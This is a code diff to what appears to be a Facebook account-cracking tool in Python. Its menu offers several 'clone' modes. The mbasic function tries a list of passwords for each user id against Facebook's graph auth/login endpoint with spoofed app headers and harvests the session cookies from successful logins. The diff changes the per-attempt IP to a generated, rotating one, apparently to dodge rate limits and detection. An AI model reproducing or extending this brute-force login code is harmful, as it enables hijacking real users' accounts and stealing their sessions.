@@ -945,7 +945,7 @@ def menu():
     print("[5] CONTACT (WHATSAPP) ")
     print("[6] EXIT TOOL ")
     linex()
-    bithi = input(f"\033[1;32m[\033[1;31m✓\033[1;32m] CHOOSE =>")
+    bithi = input(f"\033[1;32m[\033[1;31m✓\033[1;32m] CHOOSE => ")
     if bithi =='1':f_clone()
     elif bithi =='2':r_clone()
     elif bithi =='3':n_clone()
@@ -1739,7 +1739,8 @@ def mbasic(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            ip=ipz
+            ip=generate_unlimited_ips()
+            ips=f"'{ip}'"
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
@@ -1786,7 +1787,7 @@ def mbasic(uid,pwx,tl):
                 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
             }
             url = "https://graph.facebook.com/auth/login"
-            result = requests.post(url, data=data, ip=ip, headers=headers).json()
+            result = requests.post(url, data=data, ip=ips, headers=headers).json()
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
